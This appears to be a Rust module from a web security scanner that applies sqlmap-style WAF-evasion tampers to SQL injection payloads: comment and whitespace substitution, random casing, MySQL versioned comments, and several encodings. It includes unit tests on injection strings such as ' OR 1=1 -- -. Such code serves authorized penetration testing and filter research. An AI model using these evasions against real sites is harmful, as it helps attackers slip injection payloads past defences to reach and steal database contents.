#![deny(unsafe_code)]

use rand::Rng as _;
use regex::Regex;
use std::sync::OnceLock;

/// WAF evasion tamper — applies a single transformation to a payload string.
///
/// Each variant maps to a well-known `sqlmap` tamper / `PayloadsAllTheThings` technique.
/// Composition via [`apply_tampers`] allows stacking (e.g. `space2comment,randomcase`).
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
#[non_exhaustive]
pub enum Tamper {
    /// `" "` → `/**/`
    Space2Comment,
    /// `" "` → `+`
    Space2Plus,
    /// `" "` → `%09` (tab)
    Space2Tab,
    /// `" "` → `%0a` (newline)
    Space2Newline,
    /// `" "` → random blank among `%09 %0a %0c %0d %a0 +`
    Space2RandomBlank,
    /// Randomly mix `SeLeCt` case
    RandomCase,
    /// MySQL versioned comments: `SELECT` → `/*!50000SELECT*/`
    VersionedComment,
    /// Insert `/**/` between keyword letters: `SELECT` → `S/**/E/**/L...`
    BetweenComment,
    /// Percent-encode non-alnum (` ` → `%20`) — `charencode`
    CharEncode,
    /// Double URL-encode (`%` → `%25`)
    DoubleEncode,
    /// Hex `%xx` per byte
    HexEncode,
    /// Unicode `%uXXXX` per char
    UnicodeEncode,
    /// UTF-8 overlong (`/` → `%c0%af`)
    OverlongUtf8,
}

impl Tamper {
    #[must_use]
    pub fn name(&self) -> &'static str {
        match self {
            Self::Space2Comment => "space2comment",
            Self::Space2Plus => "space2plus",
            Self::Space2Tab => "space2tab",
            Self::Space2Newline => "space2newline",
            Self::Space2RandomBlank => "space2randomblank",
            Self::RandomCase => "randomcase",
            Self::VersionedComment => "versionedcomment",
            Self::BetweenComment => "betweencomment",
            Self::CharEncode => "charencode",
            Self::DoubleEncode => "doubleurlencode",
            Self::HexEncode => "hexencode",
            Self::UnicodeEncode => "unicodeencode",
            Self::OverlongUtf8 => "overlongutf8",
        }
    }

    #[must_use]
    pub fn from_name(name: &str) -> Option<Self> {
        match name.to_ascii_lowercase().as_str() {
            "space2comment" | "space2inline" | "comment" => Some(Self::Space2Comment),
            "space2plus" => Some(Self::Space2Plus),
            "space2tab" => Some(Self::Space2Tab),
            "space2newline" | "space2line" => Some(Self::Space2Newline),
            "space2randomblank" | "space2random" | "randomblank" => Some(Self::Space2RandomBlank),
            "randomcase" | "case" | "mixcase" => Some(Self::RandomCase),
            "versionedcomment" | "versioned" | "versionedkeywords" => Some(Self::VersionedComment),
            "betweencomment" | "between" | "charchar" => Some(Self::BetweenComment),
            "charencode" | "char" | "urlencode" | "url" => Some(Self::CharEncode),
            "doubleurlencode" | "doubleencode" | "doubleurl" | "double" => Some(Self::DoubleEncode),
            "hexencode" | "hex" => Some(Self::HexEncode),
            "unicodeencode" | "unicode" | "utf8unicode" => Some(Self::UnicodeEncode),
            "overlongutf8" | "overlong" | "utf8overlong" => Some(Self::OverlongUtf8),
            _ => None,
        }
    }

    #[must_use]
    pub fn all_names() -> &'static [&'static str] {
        &[
            "space2comment",
            "space2plus",
            "space2tab",
            "space2newline",
            "space2randomblank",
            "randomcase",
            "versionedcomment",
            "betweencomment",
            "charencode",
            "doubleurlencode",
            "hexencode",
            "unicodeencode",
            "overlongutf8",
        ]
    }

    /// Apply this single tamper to `payload` and return the transformed string.
    #[must_use]
    pub fn apply(&self, payload: &str) -> String {
        match self {
            Self::Space2Comment => payload.replace(' ', "/**/"),
            Self::Space2Plus => payload.replace(' ', "+"),
            Self::Space2Tab => payload.replace(' ', "%09"),
            Self::Space2Newline => payload.replace(' ', "%0a"),
            Self::Space2RandomBlank => {
                let blanks = ["%09", "%0a", "%0c", "%0d", "%a0", "+"];
                let mut rng = rand::rng();
                let mut out = String::with_capacity(payload.len() * 2);
                for ch in payload.chars() {
                    if ch == ' ' {
                        let idx = rng.random_range(0..blanks.len());
                        out.push_str(blanks[idx]);
                    } else {
                        out.push(ch);
                    }
                }
                out
            }
            Self::RandomCase => {
                let mut rng = rand::rng();
                payload
                    .chars()
                    .map(|c| {
                        if c.is_ascii_alphabetic() && rng.random_bool(0.5) {
                            if c.is_ascii_lowercase() {
                                c.to_ascii_uppercase()
                            } else {
                                c.to_ascii_lowercase()
                            }
                        } else {
                            c
                        }
                    })
                    .collect()
            }
            Self::VersionedComment => apply_versioned_comment(payload),
            Self::BetweenComment => apply_between_comment(payload),
            Self::CharEncode => char_encode(payload),
            Self::DoubleEncode => {
                let once = char_encode(payload);
                char_encode(&once)
            }
            Self::HexEncode => payload.bytes().map(|b| format!("%{b:02x}")).collect(),
            Self::UnicodeEncode => payload
                .chars()
                .map(|c| format!("%u{:04x}", c as u32))
                .collect(),
            Self::OverlongUtf8 => overlong_encode(payload),
        }
    }
}

/// Parse a comma-separated tamper list (e.g. `"space2comment,randomcase"`).
/// Unknown names are ignored with a `tracing::warn!`; empty input yields `Vec::new()`.
#[must_use]
pub fn parse_tamper_list(input: Option<&str>) -> Vec<Tamper> {
    let Some(raw) = input else {
        return Vec::new();
    };
    let trimmed = raw.trim();
    if trimmed.is_empty() || trimmed.eq_ignore_ascii_case("none") {
        return Vec::new();
    }
    trimmed
        .split(',')
        .filter_map(|part| {
            let name = part.trim();
            if name.is_empty() {
                return None;
            }
            match Tamper::from_name(name) {
                Some(t) => Some(t),
                None => {
                    tracing::warn!(tamper=%name, available=?Tamper::all_names(), "unknown tamper ignored");
                    None
                }
            }
        })
        .collect()
}

/// Apply a sequence of tampers in order. Empty slice returns `payload` unchanged.
#[must_use]
pub fn apply_tampers(payload: &str, tampers: &[Tamper]) -> String {
    let mut out = payload.to_owned();
    for t in tampers {
        out = t.apply(&out);
    }
    out
}

/// Expand `payload` into variants to try.
/// - No tampers → `[payload]`
/// - With tampers → original + each single tamper + full chain. Deduped.
///
/// This bounds explosion to `t.len()+2` variants instead of `2^t`.
#[must_use]
pub fn expand_with_tampers(payload: &str, tampers: &[Tamper]) -> Vec<String> {
    if tampers.is_empty() {
        return vec![payload.to_owned()];
    }
    let mut variants = Vec::with_capacity(tampers.len() + 2);
    variants.push(payload.to_owned());
    for t in tampers {
        let v = t.apply(payload);
        if !variants.contains(&v) {
            variants.push(v);
        }
    }
    let chained = apply_tampers(payload, tampers);
    if !variants.contains(&chained) {
        variants.push(chained);
    }
    variants
}

/// Return the list of tamper transformation sets to try.
///
/// Each set is a `Vec<Tamper>` so that paired payloads (TRUE/FALSE boolean)
/// can be transformed consistently with the same set, rather than independently
/// expanding each string and mismatching indices.
///
/// Layout: `[]` (original) + each single + full chain, deduped by resulting
/// transformation identity. Keeps the same `t.len()+2` bound as `expand_with_tampers`.
#[must_use]
pub fn tamper_transformation_sets(tampers: &[Tamper]) -> Vec<Vec<Tamper>> {
    if tampers.is_empty() {
        return vec![Vec::new()];
    }
    let mut sets: Vec<Vec<Tamper>> = Vec::with_capacity(tampers.len() + 2);
    sets.push(Vec::new());
    for t in tampers {
        let single = vec![t.clone()];
        if !sets.contains(&single) {
            sets.push(single);
        }
    }
    if !sets.contains(&tampers.to_vec()) {
        sets.push(tampers.to_vec());
    }
    sets
}

// ── helpers ──────────────────────────────────────────────────────────────

fn char_encode(input: &str) -> String {
    let mut out = String::with_capacity(input.len() * 3);
    for b in input.bytes() {
        let c = b as char;
        if c.is_ascii_alphanumeric() || c == '_' || c == '-' || c == '.' || c == '~' {
            out.push(c);
        } else {
            out.push_str(&format!("%{b:02x}"));
        }
    }
    out
}

fn overlong_encode(input: &str) -> String {
    let mut out = String::with_capacity(input.len() * 6);
    for b in input.bytes() {
        let c = b as char;
        if c.is_ascii_alphanumeric() {
            out.push(c);
        } else {
            // overlong 2-byte UTF-8: 0xC0 | (b>>6), 0x80 | (b & 0x3F)
            // for ASCII b < 0x80, first byte is always 0xC0, second is 0x80|b
            let b1 = 0xC0u8;
            let b2 = 0x80u8 | b;
            out.push_str(&format!("%{b1:02x}%{b2:02x}"));
        }
    }
    out
}

static KEYWORDS: &[&str] = &[
    "SELECT",
    "UNION",
    "OR",
    "AND",
    "FROM",
    "WHERE",
    "SLEEP",
    "BENCHMARK",
    "EXTRACTVALUE",
    "UPDATEXML",
    "CONCAT",
    "CAST",
    "CONVERT",
    "WAITFOR",
    "DELAY",
    "ORDER",
    "BY",
    "GROUP",
    "HAVING",
    "LIMIT",
    "BETWEEN",
    "LIKE",
    "INTO",
    "VALUES",
    "INSERT",
    "UPDATE",
    "DELETE",
    "DROP",
    "TABLE",
];

fn keyword_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        let pattern = format!(r"(?i)\b({})\b", KEYWORDS.join("|"));
        #[allow(clippy::unwrap_used)]
        Regex::new(&pattern).unwrap()
    })
}

fn apply_versioned_comment(payload: &str) -> String {
    let re = keyword_regex();
    re.replace_all(payload, |caps: &regex::Captures| {
        let m = &caps[0];
        format!("/*!50000{}*/", m)
    })
    .into_owned()
}

fn apply_between_comment(payload: &str) -> String {
    // Cheap heuristic: insert /**/ between letters of SQL keywords.
    // e.g. SELECT -> S/**/E/**/L/**/E/**/C/**/T
    let re = keyword_regex();
    re.replace_all(payload, |caps: &regex::Captures| {
        let m = &caps[0];
        let mut out = String::with_capacity(m.len() * 5);
        let chars: Vec<char> = m.chars().collect();
        for (i, ch) in chars.iter().enumerate() {
            out.push(*ch);
            if i + 1 < chars.len() {
                out.push_str("/**/");
            }
        }
        out
    })
    .into_owned()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_empty() {
        assert!(parse_tamper_list(None).is_empty());
        assert!(parse_tamper_list(Some("")).is_empty());
        assert!(parse_tamper_list(Some("none")).is_empty());
    }

    #[test]
    fn parse_single() {
        let v = parse_tamper_list(Some("space2comment"));
        assert_eq!(v, vec![Tamper::Space2Comment]);
    }

    #[test]
    fn parse_multiple_mixed_case() {
        let v = parse_tamper_list(Some("Space2Comment, RandomCase , charencode"));
        assert_eq!(
            v,
            vec![
                Tamper::Space2Comment,
                Tamper::RandomCase,
                Tamper::CharEncode
            ]
        );
    }

    #[test]
    fn parse_unknown_ignored() {
        let v = parse_tamper_list(Some("space2comment,notreal,hexencode"));
        assert_eq!(v, vec![Tamper::Space2Comment, Tamper::HexEncode]);
    }

    #[test]
    fn space2comment_basic() {
        let p = "' OR 1=1 -- -";
        let out = Tamper::Space2Comment.apply(p);
        assert_eq!(out, "'/**/OR/**/1=1/**/--/**/-");
    }

    #[test]
    fn space2plus_basic() {
        assert_eq!(Tamper::Space2Plus.apply("a b c"), "a+b+c");
    }

    #[test]
    fn space2tab_basic() {
        assert_eq!(Tamper::Space2Tab.apply("a b"), "a%09b");
    }

    #[test]
    fn randomcase_changes_case() {
        let out = Tamper::RandomCase.apply("select");
        // randomcase should at least contain same letters case-insensitively
        assert_eq!(out.to_ascii_lowercase(), "select");
        // length preserved
        assert_eq!(out.len(), 6);
    }

    #[test]
    fn versioned_wraps_keywords() {
        let out = Tamper::VersionedComment.apply("' OR 1=1 -- -");
        assert!(out.contains("/*!50000OR*/"), "got {out}");
        let out2 = Tamper::VersionedComment.apply("' UNION SELECT 1,2 -- -");
        assert!(out2.contains("/*!50000UNION*/"));
        assert!(out2.contains("/*!50000SELECT*/"));
    }

    #[test]
    fn betweencomment_inserts() {
        let out = Tamper::BetweenComment.apply("SELECT");
        assert_eq!(out, "S/**/E/**/L/**/E/**/C/**/T");
        let out2 = Tamper::BetweenComment.apply("' OR 1=1");
        assert!(out2.contains("O/**/R"));
    }

    #[test]
    fn charencode_encodes_space_and_quote() {
        let out = Tamper::CharEncode.apply("' OR 1=1");
        // ' -> %27, space -> %20, = -> %3d
        assert!(out.contains("%27"), "got {out}");
        assert!(out.contains("%20"));
        assert!(!out.contains(' '));
        assert!(!out.contains('\''));
    }

    #[test]
    fn doubleencode_encodes_percent() {
        let out = Tamper::DoubleEncode.apply("'");
        // ' -> %27 -> %2527 (since % -> %25)
        assert_eq!(out, "%2527");
    }

    #[test]
    fn hexencode_full() {
        let out = Tamper::HexEncode.apply("AB");
        assert_eq!(out, "%41%42");
    }

    #[test]
    fn unicodeencode_full() {
        let out = Tamper::UnicodeEncode.apply("A");
        assert_eq!(out, "%u0041");
    }

    #[test]
    fn overlong_encodes_slash() {
        let out = Tamper::OverlongUtf8.apply("/");
        // / 0x2f -> %c0%af
        assert_eq!(out, "%c0%af");
        let out2 = Tamper::OverlongUtf8.apply("a/b");
        assert!(out2.contains("%c0%af"), "got {out2}");
        assert!(out2.starts_with('a'));
    }

    #[test]
    fn apply_tampers_chain_order() {
        let payload = "a b";
        let tampers = vec![Tamper::Space2Comment, Tamper::RandomCase];
        let chained = apply_tampers(payload, &tampers);
        // first space2comment -> "a/**/b", then randomcase keeps /**/ but mixes letters
        assert!(chained.contains("/**/"), "got {chained}");
        assert_eq!(chained.to_ascii_lowercase(), "a/**/b");
    }

    #[test]
    fn expand_no_tamper_single() {
        let v = expand_with_tampers("payload", &[]);
        assert_eq!(v, vec!["payload"]);
    }

    #[test]
    fn expand_with_two_tampers() {
        let tampers = vec![Tamper::Space2Comment, Tamper::CharEncode];
        let v = expand_with_tampers("' OR 1=1", &tampers);
        // original + each single + chained = 4
        assert_eq!(v.len(), 4);
        assert_eq!(v[0], "' OR 1=1");
        assert!(v[1].contains("/**/"));
        assert!(v[2].contains("%27")); // charencode
        // chained: space2comment then charencode encodes "/" and "*" too
        assert!(v[3].contains("%2f") || v[3].contains("%2F"), "got {}", v[3]);
    }

    #[test]
    fn expand_dedupes_identical() {
        // plus and comment produce different, but if payload has no space, space tampers are no-op
        let tampers = vec![Tamper::Space2Comment, Tamper::Space2Tab];
        let v = expand_with_tampers("nospace", &tampers);
        // original == space2comment == space2tab == chained (all same) -> deduped to 1
        assert_eq!(v.len(), 1);
        assert_eq!(v[0], "nospace");
    }
}
